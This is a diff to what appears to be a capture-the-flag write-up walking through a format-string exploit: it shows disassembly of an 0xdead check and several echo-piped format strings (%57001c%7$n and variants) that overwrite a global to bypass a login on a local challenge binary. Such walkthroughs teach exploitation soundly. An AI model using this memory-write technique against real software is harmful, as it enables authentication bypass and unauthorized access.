@@ -772,7 +772,9 @@ You are the incorrect user
 ![Radare](flag8/radare.png)
 
 0x0804860c      a14ca00408     mov eax, dword obj.id_number ; [0x804a04c:4]
+
 0x08048611      3dadde0000     cmp eax, 0xdead
+
 0x08048616      7533           jne 0x804864b
 
 Now that we have a working exploit, how can we alter that to give us access? Three lines of interest came up. One moves a string into eax from 0x804a04c. The next compares eax to 0xdead. The last says "if eax is not equal to dead, jump elsewhere." This jump is what's causing us to be "unauthenticated" according to the program.
@@ -794,8 +796,11 @@ The format we want to follow for this is: `echo -e '<address>%<value - bytes wri
 We have all this information, so we can simply fill it in.
 
 Address: `0x804a04c` = `\x4c\xa0\x04\x08`
+
 Value: `0xDEAD`
+
 Bytes Written: `len(Address)` = `4`
+
 Target: `7`
 
 Because we have written 4 bytes already, our value changes from 0xDEAD to 0xDEA9. We have to turn this into decimal form for it to work AFAIK.
@@ -805,8 +810,11 @@ Because we have written 4 bytes already, our value changes from 0xDEAD to 0xDEA9
 Any of the following format strings work:
 
 `echo -e '\x4c\xa0\x04\x08%57001c%7$n' | ./binary`
+
 `echo -e '\x4c\xa0\x04\x08%57001d%7$n' | ./binary`
+
 `echo -e '\x4c\xa0\x04\x08%57001x%7$n' | ./binary`
+
 `echo -e '\x4c\xa0\x04\x08%57001u%7$n' | ./binary`
 
 Now we get a long output of text and "Welcome Dan" which means that it worked on our local binary!
